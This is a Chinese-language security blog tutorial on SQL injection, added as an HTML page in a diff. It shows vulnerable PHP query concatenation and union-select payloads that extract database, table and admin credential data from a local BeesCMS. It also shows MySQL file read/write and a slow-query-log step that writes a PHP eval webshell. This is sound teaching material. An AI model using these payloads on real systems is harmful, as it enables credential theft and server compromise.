@@ -1,0 +1,971 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="WLuffya">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1. MySQL(一)跨库&amp;Access偏移1.1 知识点： 脚本代码与数据库前置知识 select 字段 from 表名 where 字段&#x3D;条件; mysql5.0以后才有information_scheam数据库, 以前只能暴力破解   Access数据库注入-简易&amp;偏移 Access 只有一个用户, 无高权限注入点, 只能猜解, 暴力破解   MYSQL数据库注入-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2.WEB攻防-SQL注入">
+<meta property="og:url" content="https://wluffya.github.io/2023/01/01/5.WEB%E6%94%BB%E9%98%B2-SQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="WLuffya Blog">
+<meta property="og:description" content="1. MySQL(一)跨库&amp;Access偏移1.1 知识点： 脚本代码与数据库前置知识 select 字段 from 表名 where 字段&#x3D;条件; mysql5.0以后才有information_scheam数据库, 以前只能暴力破解   Access数据库注入-简易&amp;偏移 Access 只有一个用户, 无高权限注入点, 只能猜解, 暴力破解   MYSQL数据库注入-">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/jpeg/12889352/1662717227083-88dfa034-bde3-40d7-a1bd-c664d663e8d7.jpeg">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662718788503-ac2fbc8e-efa0-4703-ab35-93eea0ef3036.png#averageHue=%23f6f5f4&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=444&id=u4d9672ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=444&originWidth=945&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63803&status=done&style=none&taskId=ua1620e52-46f9-44ae-b5ec-93dd8d32357&title=&width=945">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662718924527-2b2de41f-da0c-480e-a199-007db07d2762.png#averageHue=%23f4f2f1&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=408&id=ufeba685e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=408&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69046&status=done&style=none&taskId=ue140b7c4-984f-46f2-925e-dd4779b46fe&title=&width=903">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719520316-dd31edbb-3093-4e2d-8b72-850bb4135101.png#averageHue=%23f7f6f5&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=439&id=u4147be67&margin=%5Bobject%20Object%5D&name=image.png&originHeight=439&originWidth=1357&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62940&status=done&style=none&taskId=u13175fb7-3f16-4f88-b79e-4bf3a75de11&title=&width=1357">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719607872-2e5437ae-7133-41df-9fde-bb3b191b3c65.png#averageHue=%23f7f6f5&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=496&id=u08ad30bc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=496&originWidth=1446&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85647&status=done&style=none&taskId=u8b507126-79c4-44f6-b4e5-7c964d7c389&title=&width=1446">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719865263-ca186261-67e6-49cd-9add-64065e8cfed2.png#averageHue=%23f4d8d6&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=413&id=u80b7e053&margin=%5Bobject%20Object%5D&name=image.png&originHeight=413&originWidth=947&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62977&status=done&style=none&taskId=ue0f98e40-459a-42e6-b5af-2f827e48dda&title=&width=947">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662720664222-28869943-23c5-4008-8f45-c1eb16e25413.png#averageHue=%23f6f5f4&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=480&id=u6d71118f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1275&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72099&status=done&style=none&taskId=ue5e29058-fba3-4f10-ac57-f2bd8cbb352&title=&width=1275">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662721144974-186d7790-7391-4e66-8568-3bb342877fc0.png#averageHue=%23f9e8e7&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=509&id=u81a69782&margin=%5Bobject%20Object%5D&name=image.png&originHeight=509&originWidth=1238&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46049&status=done&style=none&taskId=u3f8945d3-2aad-419b-ac86-f6ccef36b30&title=&width=1238">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662904260041-3c830eca-8a9c-4fd8-8204-bed4250af70a.png#averageHue=%23f9f8f8&clientId=uf402b5e3-f838-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=382&id=u20d1d16a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=478&originWidth=914&originalType=binary&ratio=1&rotation=0&showTitle=false&size=256411&status=done&style=none&taskId=ud7ceb4a1-d110-4472-8e60-d86701ebfb8&title=&width=731.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662905491413-1da472de-4c38-4a20-978a-41eb7cbcc7b3.png#averageHue=%23eeedeb&clientId=uf402b5e3-f838-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=125&id=ud88a4cbf&margin=%5Bobject%20Object%5D&name=image.png&originHeight=156&originWidth=460&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7214&status=done&style=none&taskId=ucabbe095-5926-4ef6-b906-b696c4a0859&title=&width=368">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970652984-dda77749-cecc-4fd0-95bf-1ac1594e31c4.png#averageHue=%23fcfcfc&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=drop&id=u2bb66828&margin=%5Bobject%20Object%5D&name=%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202022-09-12%20161720.png&originHeight=357&originWidth=892&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16689&status=done&style=none&taskId=ua2ff3515-b69b-4dd1-b844-9670f560d9b&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970562301-01177dba-cd1b-4ff7-bd32-23bc575c070e.png#averageHue=%23f3f1f0&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=0.734&from=paste&height=195&id=u2a2f4e1e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=593&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22732&status=done&style=none&taskId=uc47e707b-c976-4251-8bea-db76a0713d9&title=&width=477">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662971046141-f6981ba9-11b1-4800-bbf3-77a565fbbf99.png#averageHue=%23fbf7f6&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=294&id=ud11624c7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=368&originWidth=598&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52540&status=done&style=none&taskId=ufd53a628-4bb0-45ce-8abe-0290f1da1c9&title=&width=478.4">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662970559563-c41ff0ab-914f-4fa0-9f23-751d4c58bab1.png#averageHue=%23f3f1f0&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=0.7271&from=paste&height=194&id=u42899b0f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=243&originWidth=593&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22732&status=done&style=none&taskId=u1ea862ae-49d5-4d22-bbd9-2e330177f4e&title=&width=474">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662964645817-9218a08f-9511-4546-8035-d9d550e53490.png#averageHue=%23eceeeb&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=drop&id=u81b759be&margin=%5Bobject%20Object%5D&name=image.png&originHeight=277&originWidth=558&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112010&status=done&style=none&taskId=u58aa954f-da43-4447-a1f5-89c8ae268f0&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662975992141-34c96e66-1229-4751-a61e-7f29d038adf0.png#averageHue=%23efeeed&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=278&id=u493b2804&margin=%5Bobject%20Object%5D&name=image.png&originHeight=347&originWidth=1089&originalType=binary&ratio=1&rotation=0&showTitle=false&size=47393&status=done&style=none&taskId=u8b198a81-46e8-4da4-b2a7-c3e0315ac27&title=&width=871.2">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662976075905-f11b0af9-0c94-490d-8dbf-d68871cf4133.png#averageHue=%23f0f0ef&clientId=u80c87768-7763-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=243&id=u57cd69aa&margin=%5Bobject%20Object%5D&name=image.png&originHeight=304&originWidth=829&originalType=binary&ratio=1&rotation=0&showTitle=false&size=20739&status=done&style=none&taskId=u23580700-9423-439d-a16b-b13cd83870d&title=&width=663.2">
+<meta property="article:published_time" content="2023-01-01T03:01:23.000Z">
+<meta property="article:modified_time" content="2023-01-01T03:08:01.275Z">
+<meta property="article:author" content="WLuffya">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="网络安全">
+<meta property="article:tag" content="WEB安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/jpeg/12889352/1662717227083-88dfa034-bde3-40d7-a1bd-c664d663e8d7.jpeg">
+  
+  
+  
+  <title>2.WEB攻防-SQL注入 - WLuffya Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"wluffya.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>WLuffy</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://i.328888.xyz/2023/01/01/na33L.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2.WEB攻防-SQL注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-01-01 11:01" pubdate>
+          2023年1月1日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          17k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          139 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2.WEB攻防-SQL注入</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1-MySQL-一-跨库-amp-Access偏移"><a href="#1-MySQL-一-跨库-amp-Access偏移" class="headerlink" title="1. MySQL(一)跨库&amp;Access偏移"></a>1. MySQL(一)跨库&amp;Access偏移</h2><h3 id="1-1-知识点："><a href="#1-1-知识点：" class="headerlink" title="1.1 知识点："></a>1.1 知识点：</h3><ul>
+<li>脚本代码与数据库前置知识<ul>
+<li>select 字段 from 表名 where 字段&#x3D;条件;</li>
+<li>mysql5.0以后才有information_scheam数据库, 以前只能暴力破解</li>
+</ul>
+</li>
+<li>Access数据库注入-简易&amp;偏移<ul>
+<li>Access 只有一个用户, 无高权限注入点, 只能猜解, 暴力破解</li>
+</ul>
+</li>
+<li>MYSQL数据库注入-简易&amp;权限跨库</li>
+</ul>
+<p>漏洞产生根本条件：可控变量 特定函数</p>
+<h3 id="1-2-前置知识："><a href="#1-2-前置知识：" class="headerlink" title="1.2 前置知识："></a>1.2 前置知识：</h3><h4 id="SQL注入漏洞产生原理分析"><a href="#SQL注入漏洞产生原理分析" class="headerlink" title="SQL注入漏洞产生原理分析"></a>SQL注入漏洞产生原理分析</h4><p><strong>开发者没有在网页传参点做好过滤，导致非法参数拼接到sql语句中, 数据库进行执行产生了不合法操作</strong></p>
+<p>脚本代码在实现代码与数据库进行数据通讯时（从数据库取出相关数据进行页面显示），将定义的SQL语句进行执行查询数据时。其中的SQL语句能通过参数传递自定义值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（数据库中的敏感数据，如管理员帐号密码）。这一个过程就可以叫做SQL注入漏洞。</p>
+<h4 id="SQL注入漏洞危害利用分析"><a href="#SQL注入漏洞危害利用分析" class="headerlink" title="SQL注入漏洞危害利用分析"></a>SQL注入漏洞危害利用分析</h4><p>管理员密码泄露, 后门文件写入, 数据泄露, 服务器权限</p>
+<h4 id="脚本代码与数据库操作流程"><a href="#脚本代码与数据库操作流程" class="headerlink" title="脚本代码与数据库操作流程"></a>脚本代码与数据库操作流程</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">url: http:<span class="hljs-comment">//192.168.100.10/index.php?id=1</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;/config/conn.php&quot;</span>);<br><span class="hljs-variable">$i</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-comment">//GET请求接受id参数名值给变量i</span><br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from bees_article where id=<span class="hljs-subst">$i</span>&quot;</span>;<br><span class="hljs-comment">// 通过url访问传入id参数, 并拼接到sql语句中</span><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>,<span class="hljs-variable">$conn</span>);<br></code></pre></td></tr></table></figure>
+<h4 id="数据库名，表名，列名，数据"><a href="#数据库名，表名，列名，数据" class="headerlink" title="数据库名，表名，列名，数据"></a>数据库名，表名，列名，数据</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/12889352/1662717227083-88dfa034-bde3-40d7-a1bd-c664d663e8d7.jpeg" srcset="/img/loading.gif" lazyload></p>
+<h4 id="数据库类型，数据库用户，用户权限"><a href="#数据库类型，数据库用户，用户权限" class="headerlink" title="数据库类型，数据库用户，用户权限"></a>数据库类型，数据库用户，用户权限</h4><p>Access是独立存在的, 一个网站就这一个数据库文件<br>MySQL是统一管理的, 里面不光当前网站的数据库, 还可能存在其他网站数据库<br>MySQL用户:</p>
+<ul>
+<li>最高权限root: 可进行跨库注入, 文件读写操作</li>
+<li>其他用户: 只能渗透本库, 常规猜解内容</li>
+</ul>
+<h3 id="1-3-演示案例"><a href="#1-3-演示案例" class="headerlink" title="1.3 演示案例"></a>1.3 演示案例</h3><ul>
+<li>SQL注入一般性猜解注入步骤<ul>
+<li>?id&#x3D;1 order by 4 猜有几个字段</li>
+<li>?id&#x3D;1 union 1,2,3,4 看那个字段会在页面回显</li>
+<li>?id&#x3D;1 union 1,2,user(),4 根据回显字段获取: 用户名user(), 版本version(), 系统@@version_complie_os, 数据库名database()</li>
+</ul>
+</li>
+<li>ASP+Access-简易注入-字典猜解</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662718788503-ac2fbc8e-efa0-4703-ab35-93eea0ef3036.png#averageHue=%23f6f5f4&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=444&id=u4d9672ae&margin=%5Bobject%20Object%5D&name=image.png&originHeight=444&originWidth=945&originalType=binary&ratio=1&rotation=0&showTitle=false&size=63803&status=done&style=none&taskId=ua1620e52-46f9-44ae-b5ec-93dd8d32357&title=&width=945" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662718924527-2b2de41f-da0c-480e-a199-007db07d2762.png#averageHue=%23f4f2f1&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=408&id=ufeba685e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=408&originWidth=903&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69046&status=done&style=none&taskId=ue140b7c4-984f-46f2-925e-dd4779b46fe&title=&width=903" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719520316-dd31edbb-3093-4e2d-8b72-850bb4135101.png#averageHue=%23f7f6f5&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=439&id=u4147be67&margin=%5Bobject%20Object%5D&name=image.png&originHeight=439&originWidth=1357&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62940&status=done&style=none&taskId=u13175fb7-3f16-4f88-b79e-4bf3a75de11&title=&width=1357" srcset="/img/loading.gif" lazyload alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719607872-2e5437ae-7133-41df-9fde-bb3b191b3c65.png#averageHue=%23f7f6f5&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=496&id=u08ad30bc&margin=%5Bobject%20Object%5D&name=image.png&originHeight=496&originWidth=1446&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85647&status=done&style=none&taskId=u8b507126-79c4-44f6-b4e5-7c964d7c389&title=&width=1446" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<ul>
+<li><p>ASP+Access-偏移注入-报错显示</p>
+<blockquote>
+<p>用于只知道表名, 不知道字段名的情况下</p>
+</blockquote>
+</li>
+<li><p>PHP+MYSQL-跨库注入-权限属性</p>
+</li>
+</ul>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662719865263-ca186261-67e6-49cd-9add-64065e8cfed2.png#averageHue=%23f4d8d6&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=413&id=u80b7e053&margin=%5Bobject%20Object%5D&name=image.png&originHeight=413&originWidth=947&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62977&status=done&style=none&taskId=ue0f98e40-459a-42e6-b5af-2f827e48dda&title=&width=947" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<h2 id="获取数据库名-判断用户"><a href="#获取数据库名-判断用户" class="headerlink" title="获取数据库名, 判断用户"></a>获取数据库名, 判断用户</h2><p>127.0.0.1&#x2F;blog1&#x2F;news.php?id&#x3D;1 union select user(),database()</p>
+<h2 id="获取管理员表名"><a href="#获取管理员表名" class="headerlink" title="获取管理员表名"></a>获取管理员表名</h2><p>127.0.0.1&#x2F;blog1&#x2F;news.php?id&#x3D;1 union select table_schema, table_name from information_schema.tables where table_schema&#x3D;”beescms”</p>
+<h2 id="获取管理员表中的字段"><a href="#获取管理员表中的字段" class="headerlink" title="获取管理员表中的字段"></a>获取管理员表中的字段</h2><p>127.0.0.1&#x2F;blog1&#x2F;news.php?id&#x3D;1 union select table_name, column_name from information_schema.columns where table_schema&#x3D;”beescms” and table_name&#x3D;”bees_admin”</p>
+<h2 id="获取字段信息"><a href="#获取字段信息" class="headerlink" title="获取字段信息"></a>获取字段信息</h2><p>127.0.0.1&#x2F;blog1&#x2F;news.php?id&#x3D;1 union select admin_name,admin_password from beescms.bees_admin</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662720664222-28869943-23c5-4008-8f45-c1eb16e25413.png#averageHue=%23f6f5f4&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=480&id=u6d71118f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=480&originWidth=1275&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72099&status=done&style=none&taskId=ue5e29058-fba3-4f10-ac57-f2bd8cbb352&title=&width=1275" srcset="/img/loading.gif" lazyload alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/12889352/1662721144974-186d7790-7391-4e66-8568-3bb342877fc0.png#averageHue=%23f9e8e7&clientId=uea2bfe15-a416-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=509&id=u81a69782&margin=%5Bobject%20Object%5D&name=image.png&originHeight=509&originWidth=1238&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46049&status=done&style=none&taskId=u3f8945d3-2aad-419b-ac86-f6ccef36b30&title=&width=1238" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="1-4-补充Burpsuite-加密暴力破击"><a href="#1-4-补充Burpsuite-加密暴力破击" class="headerlink" title="1.4 补充Burpsuite 加密暴力破击"></a>1.4 补充Burpsuite 加密暴力破击</h3><h2 id="2-MySQL-二-amp-MSSQL-SQLServer-amp-PostgreSQL"><a href="#2-MySQL-二-amp-MSSQL-SQLServer-amp-PostgreSQL" class="headerlink" title="2. MySQL(二)&amp;MSSQL(SQLServer)&amp;PostgreSQL"></a>2. MySQL(二)&amp;MSSQL(SQLServer)&amp;PostgreSQL</h2><h3 id="2-1-知识点："><a href="#2-1-知识点：" class="headerlink" title="2.1 知识点："></a>2.1 知识点：</h3><p>1、SQL注入-MYSQL数据库<br>select load_file(“d:&#x2F;1.txt”) 读取文件<br>select “xxxxx” into outfile “d:&#x2F;1.txt” 写入文件<br>当文件存在, 读取不到内容的时候, 可能是secure_file_prive没有设置为空<br>show variables like “secure_file_priv”;  查询值<br><strong>在my.ini 文件 [mysqld]这个选项下</strong>加入变量声明：secure_file_priv&#x3D;’’</p>
+<table>
+<thead>
+<tr>
+<th><strong>secure_file_priv值</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NULL</td>
+<td>禁止文件的导入导出</td>
+</tr>
+<tr>
+<td>‘’</td>
+<td>（空字符串）允许所有文件的导入导出</td>
+</tr>
+<tr>
+<td>一个特定的路径地址</td>
+<td>只有该路径地址下的文件可以导入导出到mysql</td>
+</tr>
+</tbody></table>
+<p>2、SQL注入-MSSQL数据库</p>
+<p>3、SQL注入-PostgreSQL数据库<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ba0297da2c2e">https://www.jianshu.com/p/ba0297da2c2e</a><br>4、读取文件时路径怎么来?</p>
+<blockquote>
+<p><strong>报错, phpinfo,字典</strong></p>
+</blockquote>
+<h3 id="2-2-演示案例："><a href="#2-2-演示案例：" class="headerlink" title="2.2 演示案例："></a>2.2 演示案例：</h3><ul>
+<li><p>MYSQL-root高权限读写注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">无法写入：secure_file_priv突破 注入中需要支持SQL执行环境，<br>没有就需要借助phpmyadmin或能够直接连上对方数据库进行绕过, <br>思路1通过日志写入后门代码:<br>	<span class="hljs-built_in">set</span> global slow_query_log=1;<br>	<span class="hljs-built_in">set</span> global slow_query_log_file=<span class="hljs-string">&#x27;shell路径&#x27;</span>;<br>	select <span class="hljs-string">&#x27;&lt;?php eval($_GET[A])?&gt;&#x27;</span> or <span class="hljs-built_in">sleep</span>(11);<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>PostgreSQL-高权限读写注入</p>
+<blockquote>
+<ol>
+<li>测试列数方式为null填充</li>
+</ol>
+</blockquote>
+</li>
+</ul>
